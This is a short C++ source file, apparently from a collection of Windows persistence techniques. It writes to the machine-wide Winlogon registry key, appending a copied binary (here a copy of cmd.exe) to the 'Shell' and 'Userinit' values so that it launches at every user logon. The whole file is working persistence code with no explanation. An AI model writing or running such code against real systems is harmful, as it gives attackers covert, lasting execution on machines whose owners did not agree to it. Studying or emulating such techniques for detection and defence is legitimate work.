#include <windows.h>
#include <string>

#include "..\..\utils.h"

using namespace std;

HKEY RootKey = HKEY_LOCAL_MACHINE;
LPCSTR SubKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

int main(){

    string binaryPath = newBinary(ExePath);

    string shell_str = "explorer.exe," + binaryPath;
    string userInit_str = "C:\\Windows\\System32\\userinit.exe," + binaryPath;

    set_registry_value(RootKey, SubKey, "Shell", &shell_str, NULL);
    set_registry_value(RootKey, SubKey, "Userinit", &userInit_str, NULL);

    return 0;
}